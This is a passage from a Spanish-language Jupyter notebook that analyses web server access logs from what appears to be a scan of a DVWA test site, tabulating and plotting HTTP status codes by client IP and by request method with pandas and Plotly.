            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "caxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "title": {
           "x": 0.05
          },
          "xaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          },
          "yaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          }
         }
        },
        "title": {
         "text": "Distribución de los Status Code de las peticiones"
        },
        "xaxis": {
         "anchor": "y",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "Status Code"
         }
        },
        "yaxis": {
         "anchor": "x",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "count"
         }
        }
       }
      }
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "total_peticiones = peticiones_status['count'].sum()\n",
    "\n",
    "# Calcular el porcentaje de cada barra con dos decimales\n",
    "peticiones_status['porcentaje'] = (peticiones_status['count'] / total_peticiones * 100).round(2)\n",
    "\n",
    "# Crear el gráfico de barras\n",
    "fig = px.bar(peticiones_status, x='Status Code', y='count', title='Distribución de los Status Code de las peticiones',\n",
    "             text=peticiones_status['porcentaje'].astype(str) + '%')  # Mostrar el porcentaje de cada barra con dos decimales como texto\n",
    "\n",
    "# Mostrar el gráfico\n",
    "fig.show()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>count</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>200</td>\n",
       "      <td>2553</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>404</td>\n",
       "      <td>2488</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>500</td>\n",
       "      <td>6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>302</td>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>200</td>\n",
       "      <td>574</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>404</td>\n",
       "      <td>180</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>500</td>\n",
       "      <td>152</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>302</td>\n",
       "      <td>45</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>301</td>\n",
       "      <td>17</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>9</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>400</td>\n",
       "      <td>11</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>10</th>\n",
       "      <td>192.168.4.25</td>\n",
       "      <td>403</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "        Client IP  Status Code  count\n",
       "0   192.168.4.164          200   2553\n",
       "1   192.168.4.164          404   2488\n",
       "2   192.168.4.164          500      6\n",
       "3   192.168.4.164          302      5\n",
       "4    192.168.4.25          200    574\n",
       "5    192.168.4.25          404    180\n",
       "6    192.168.4.25          500    152\n",
       "7    192.168.4.25          302     45\n",
       "8    192.168.4.25          301     17\n",
       "9    192.168.4.25          400     11\n",
       "10   192.168.4.25          403      1"
      ]
     },
     "execution_count": 63,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "peticiones_status = peticiones.groupby('Client IP')['Status Code'].value_counts().reset_index()\n",
    "peticiones_status"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 64,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.plotly.v1+json": {
       "config": {
        "plotlyServerURL": "https://plot.ly"
       },
       "data": [
        {
         "alignmentgroup": "True",
         "hovertemplate": "Client IP=192.168.4.164<br>Status Code=%{x}<br>count=%{y}<br>text=%{text}<extra></extra>",
         "legendgroup": "192.168.4.164",
         "marker": {
          "color": "#636efa",
          "pattern": {
           "shape": ""
          }
         },
         "name": "192.168.4.164",
         "offsetgroup": "192.168.4.164",
         "orientation": "v",
         "showlegend": true,
         "text": [
          "42.32%",
          "41.25%",
          "0.1%",
          "0.08%"
         ],
         "textposition": "auto",
         "type": "bar",
         "x": [
          200,
          404,
          500,
          302
         ],
         "xaxis": "x",
         "y": [
          2553,
          2488,
          6,
          5
         ],
         "yaxis": "y"
        },
        {
         "alignmentgroup": "True",
         "hovertemplate": "Client IP=192.168.4.25<br>Status Code=%{x}<br>count=%{y}<br>text=%{text}<extra></extra>",
         "legendgroup": "192.168.4.25",
         "marker": {
          "color": "#EF553B",
          "pattern": {
           "shape": ""
          }
         },
         "name": "192.168.4.25",
         "offsetgroup": "192.168.4.25",
         "orientation": "v",
         "showlegend": true,
         "text": [
          "9.52%",
          "2.98%",
          "2.52%",
          "0.75%",
          "0.28%",
          "0.18%",
          "0.02%"
         ],
         "textposition": "auto",
         "type": "bar",
         "x": [
          200,
          404,
          500,
          302,
          301,
          400,
          403
         ],
         "xaxis": "x",
         "y": [
          574,
          180,
          152,
          45,
          17,
          11,
          1
         ],
         "yaxis": "y"
        }
       ],
       "layout": {
        "barmode": "relative",
        "legend": {
         "title": {
          "text": "Client IP"
         },
         "tracegroupgap": 0
        },
        "template": {
         "data": {
          "bar": [
           {
            "error_x": {
             "color": "#2a3f5f"
            },
            "error_y": {
             "color": "#2a3f5f"
            },
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "bar"
           }
          ],
          "barpolar": [
           {
            "marker": {
             "line": {
              "color": "#E5ECF6",
              "width": 0.5
             },
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "barpolar"
           }
          ],
          "carpet": [
           {
            "aaxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "baxis": {
             "endlinecolor": "#2a3f5f",
             "gridcolor": "white",
             "linecolor": "white",
             "minorgridcolor": "white",
             "startlinecolor": "#2a3f5f"
            },
            "type": "carpet"
           }
          ],
          "choropleth": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "choropleth"
           }
          ],
          "contour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "contour"
           }
          ],
          "contourcarpet": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "contourcarpet"
           }
          ],
          "heatmap": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmap"
           }
          ],
          "heatmapgl": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "heatmapgl"
           }
          ],
          "histogram": [
           {
            "marker": {
             "pattern": {
              "fillmode": "overlay",
              "size": 10,
              "solidity": 0.2
             }
            },
            "type": "histogram"
           }
          ],
          "histogram2d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2d"
           }
          ],
          "histogram2dcontour": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "histogram2dcontour"
           }
          ],
          "mesh3d": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "type": "mesh3d"
           }
          ],
          "parcoords": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "parcoords"
           }
          ],
          "pie": [
           {
            "automargin": true,
            "type": "pie"
           }
          ],
          "scatter": [
           {
            "fillpattern": {
             "fillmode": "overlay",
             "size": 10,
             "solidity": 0.2
            },
            "type": "scatter"
           }
          ],
          "scatter3d": [
           {
            "line": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatter3d"
           }
          ],
          "scattercarpet": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattercarpet"
           }
          ],
          "scattergeo": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergeo"
           }
          ],
          "scattergl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattergl"
           }
          ],
          "scattermapbox": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scattermapbox"
           }
          ],
          "scatterpolar": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolar"
           }
          ],
          "scatterpolargl": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterpolargl"
           }
          ],
          "scatterternary": [
           {
            "marker": {
             "colorbar": {
              "outlinewidth": 0,
              "ticks": ""
             }
            },
            "type": "scatterternary"
           }
          ],
          "surface": [
           {
            "colorbar": {
             "outlinewidth": 0,
             "ticks": ""
            },
            "colorscale": [
             [
              0,
              "#0d0887"
             ],
             [
              0.1111111111111111,
              "#46039f"
             ],
             [
              0.2222222222222222,
              "#7201a8"
             ],
             [
              0.3333333333333333,
              "#9c179e"
             ],
             [
              0.4444444444444444,
              "#bd3786"
             ],
             [
              0.5555555555555556,
              "#d8576b"
             ],
             [
              0.6666666666666666,
              "#ed7953"
             ],
             [
              0.7777777777777778,
              "#fb9f3a"
             ],
             [
              0.8888888888888888,
              "#fdca26"
             ],
             [
              1,
              "#f0f921"
             ]
            ],
            "type": "surface"
           }
          ],
          "table": [
           {
            "cells": {
             "fill": {
              "color": "#EBF0F8"
             },
             "line": {
              "color": "white"
             }
            },
            "header": {
             "fill": {
              "color": "#C8D4E3"
             },
             "line": {
              "color": "white"
             }
            },
            "type": "table"
           }
          ]
         },
         "layout": {
          "annotationdefaults": {
           "arrowcolor": "#2a3f5f",
           "arrowhead": 0,
           "arrowwidth": 1
          },
          "autotypenumbers": "strict",
          "coloraxis": {
           "colorbar": {
            "outlinewidth": 0,
            "ticks": ""
           }
          },
          "colorscale": {
           "diverging": [
            [
             0,
             "#8e0152"
            ],
            [
             0.1,
             "#c51b7d"
            ],
            [
             0.2,
             "#de77ae"
            ],
            [
             0.3,
             "#f1b6da"
            ],
            [
             0.4,
             "#fde0ef"
            ],
            [
             0.5,
             "#f7f7f7"
            ],
            [
             0.6,
             "#e6f5d0"
            ],
            [
             0.7,
             "#b8e186"
            ],
            [
             0.8,
             "#7fbc41"
            ],
            [
             0.9,
             "#4d9221"
            ],
            [
             1,
             "#276419"
            ]
           ],
           "sequential": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ],
           "sequentialminus": [
            [
             0,
             "#0d0887"
            ],
            [
             0.1111111111111111,
             "#46039f"
            ],
            [
             0.2222222222222222,
             "#7201a8"
            ],
            [
             0.3333333333333333,
             "#9c179e"
            ],
            [
             0.4444444444444444,
             "#bd3786"
            ],
            [
             0.5555555555555556,
             "#d8576b"
            ],
            [
             0.6666666666666666,
             "#ed7953"
            ],
            [
             0.7777777777777778,
             "#fb9f3a"
            ],
            [
             0.8888888888888888,
             "#fdca26"
            ],
            [
             1,
             "#f0f921"
            ]
           ]
          },
          "colorway": [
           "#636efa",
           "#EF553B",
           "#00cc96",
           "#ab63fa",
           "#FFA15A",
           "#19d3f3",
           "#FF6692",
           "#B6E880",
           "#FF97FF",
           "#FECB52"
          ],
          "font": {
           "color": "#2a3f5f"
          },
          "geo": {
           "bgcolor": "white",
           "lakecolor": "white",
           "landcolor": "#E5ECF6",
           "showlakes": true,
           "showland": true,
           "subunitcolor": "white"
          },
          "hoverlabel": {
           "align": "left"
          },
          "hovermode": "closest",
          "mapbox": {
           "style": "light"
          },
          "paper_bgcolor": "white",
          "plot_bgcolor": "#E5ECF6",
          "polar": {
           "angularaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "radialaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "scene": {
           "xaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "yaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           },
           "zaxis": {
            "backgroundcolor": "#E5ECF6",
            "gridcolor": "white",
            "gridwidth": 2,
            "linecolor": "white",
            "showbackground": true,
            "ticks": "",
            "zerolinecolor": "white"
           }
          },
          "shapedefaults": {
           "line": {
            "color": "#2a3f5f"
           }
          },
          "ternary": {
           "aaxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "baxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           },
           "bgcolor": "#E5ECF6",
           "caxis": {
            "gridcolor": "white",
            "linecolor": "white",
            "ticks": ""
           }
          },
          "title": {
           "x": 0.05
          },
          "xaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          },
          "yaxis": {
           "automargin": true,
           "gridcolor": "white",
           "linecolor": "white",
           "ticks": "",
           "title": {
            "standoff": 15
           },
           "zerolinecolor": "white",
           "zerolinewidth": 2
          }
         }
        },
        "title": {
         "text": "Distribución de los Status Code de las peticiones"
        },
        "xaxis": {
         "anchor": "y",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "Status Code"
         }
        },
        "yaxis": {
         "anchor": "x",
         "domain": [
          0,
          1
         ],
         "title": {
          "text": "count"
         }
        }
       }
      }
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "total_peticiones = peticiones_status['count'].sum()\n",
    "\n",
    "# Calcular el porcentaje de cada barra con dos decimales\n",
    "peticiones_status['porcentaje'] = (peticiones_status['count'] / total_peticiones * 100).round(2)\n",
    "\n",
    "# Crear el gráfico de barras\n",
    "fig = px.bar(peticiones_status, x='Status Code', y='count', color='Client IP', title='Distribución de los Status Code de las peticiones',\n",
    "             text=peticiones_status['porcentaje'].astype(str) + '%')  # Mostrar el porcentaje de cada barra con dos decimales como texto\n",
    "\n",
    "# Mostrar el gráfico\n",
    "fig.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Mirar mejor este grafico para poner en que porcentaje a cada uno le son correctas"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Envios % que se hacen bien"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 65,
   "metadata": {},
   "outputs": [],
   "source": [
    "envios = df[-df['Method'].isin(['GET', 'HEAD', 'NETSPARKER'])]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 66,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>index</th>\n",
       "      <th>Client IP</th>\n",
       "      <th>Ident</th>\n",
       "      <th>Auth</th>\n",
       "      <th>Timestamp</th>\n",
       "      <th>Method</th>\n",
       "      <th>Request</th>\n",
       "      <th>HTTP Version</th>\n",
       "      <th>Status Code</th>\n",
       "      <th>Bytes Sent</th>\n",
       "      <th>...</th>\n",
       "      <th>User Agent</th>\n",
       "      <th>Client IP_encoded</th>\n",
       "      <th>Referrer_encoded</th>\n",
       "      <th>Method_encoded</th>\n",
       "      <th>Timestamp:</th>\n",
       "      <th>Hora</th>\n",
       "      <th>Dia</th>\n",
       "      <th>Latencia</th>\n",
       "      <th>Peticiones</th>\n",
       "      <th>Envios</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>835</th>\n",
       "      <td>938</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:10 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/DVWA/login.php</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>302</td>\n",
       "      <td>329</td>\n",
       "      <td>...</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>5</td>\n",
       "      <td>4</td>\n",
       "      <td>2023-12-22 15:19:10+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1721</th>\n",
       "      <td>1825</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:16 +0300</td>\n",
       "      <td>OPTIONS</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "      <td>...</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>3</td>\n",
       "      <td>2023-12-22 15:19:16+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1722</th>\n",
       "      <td>1827</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:16 +0300</td>\n",
       "      <td>PROPFIND</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "      <td>...</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>5</td>\n",
       "      <td>2023-12-22 15:19:16+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1738</th>\n",
       "      <td>1843</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:17 +0300</td>\n",
       "      <td>POST</td>\n",
       "      <td>/DVWA/setup.php</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>302</td>\n",
       "      <td>335</td>\n",
       "      <td>...</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>41</td>\n",
       "      <td>4</td>\n",
       "      <td>2023-12-22 15:19:17+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1739</th>\n",
       "      <td>1844</td>\n",
       "      <td>192.168.4.164</td>\n",
       "      <td>-</td>\n",
       "      <td>-</td>\n",
       "      <td>22/Dec/2023:15:19:17 +0300</td>\n",
       "      <td>PROPFIND</td>\n",
       "      <td>/DVWA/</td>\n",
       "      <td>HTTP/1.1</td>\n",
       "      <td>200</td>\n",
       "      <td>1964</td>\n",
       "      <td>...</td>\n",
       "      <td>Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...</td>\n",
       "      <td>0</td>\n",
       "      <td>0</td>\n",
       "      <td>5</td>\n",
       "      <td>2023-12-22 15:19:17+03:00</td>\n",
       "      <td>15</td>\n",
       "      <td>22</td>\n",
       "      <td>0.0</td>\n",
       "      <td>0</td>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "<p>5 rows × 21 columns</p>\n",
       "</div>"
      ],
      "text/plain": [
       "      index      Client IP Ident Auth                   Timestamp    Method  \\\n",
       "835     938  192.168.4.164     -    -  22/Dec/2023:15:19:10 +0300      POST   \n",
       "1721   1825  192.168.4.164     -    -  22/Dec/2023:15:19:16 +0300   OPTIONS   \n",
       "1722   1827  192.168.4.164     -    -  22/Dec/2023:15:19:16 +0300  PROPFIND   \n",
       "1738   1843  192.168.4.164     -    -  22/Dec/2023:15:19:17 +0300      POST   \n",
       "1739   1844  192.168.4.164     -    -  22/Dec/2023:15:19:17 +0300  PROPFIND   \n",
       "\n",
       "              Request HTTP Version  Status Code  Bytes Sent  ...  \\\n",
       "835   /DVWA/login.php     HTTP/1.1          302         329  ...   \n",
       "1721           /DVWA/     HTTP/1.1          200        1964  ...   \n",
       "1722           /DVWA/     HTTP/1.1          200        1964  ...   \n",
       "1738  /DVWA/setup.php     HTTP/1.1          302         335  ...   \n",
       "1739           /DVWA/     HTTP/1.1          200        1964  ...   \n",
       "\n",
       "                                             User Agent Client IP_encoded  \\\n",
       "835   Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                 0   \n",
       "1721  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                 0   \n",
       "1722  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                 0   \n",
       "1738  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                 0   \n",
       "1739  Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKi...                 0   \n",
       "\n",
       "      Referrer_encoded  Method_encoded                Timestamp: Hora  Dia  \\\n",
       "835                  5               4 2023-12-22 15:19:10+03:00   15   22   \n",
       "1721                 0               3 2023-12-22 15:19:16+03:00   15   22   \n",
       "1722                 0               5 2023-12-22 15:19:16+03:00   15   22   \n",
       "1738                41               4 2023-12-22 15:19:17+03:00   15   22   \n",
       "1739                 0               5 2023-12-22 15:19:17+03:00   15   22   \n",
       "\n",
       "      Latencia  Peticiones  Envios  \n",
       "835        0.0           0       1  \n",
       "1721       0.0           0       1  \n",
       "1722       0.0           0       1  \n",
       "1738       0.0           0       1  \n",
       "1739       0.0           0       1  \n",
       "\n",
       "[5 rows x 21 columns]"
      ]
     },
     "execution_count": 66,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "envios.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 67,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>Status Code</th>\n",
       "      <th>count</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>0</th>\n",
       "      <td>303</td>\n",
       "      <td>3011</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1</th>\n",
       "      <td>200</td>\n",
       "      <td>1393</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2</th>\n",
       "      <td>500</td>\n",
       "      <td>416</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3</th>\n",
       "      <td>302</td>\n",
       "      <td>140</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4</th>\n",
       "      <td>404</td>\n",
       "      <td>45</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5</th>\n",
       "      <td>405</td>\n",
       "      <td>6</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6</th>\n",
       "      <td>403</td>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "   Status Code  count\n",
       "0          303   3011\n",
       "1          200   1393\n",
       "2          500    416\n",
       "3          302    140\n",
       "4          404     45\n",
       "5          405      6\n",
       "6          403      2"
      ]
     },
     "execution_count": 67,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "envios_status = envios['Status Code'].value_counts().reset_index()\n",
    "envios_status"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "data": {
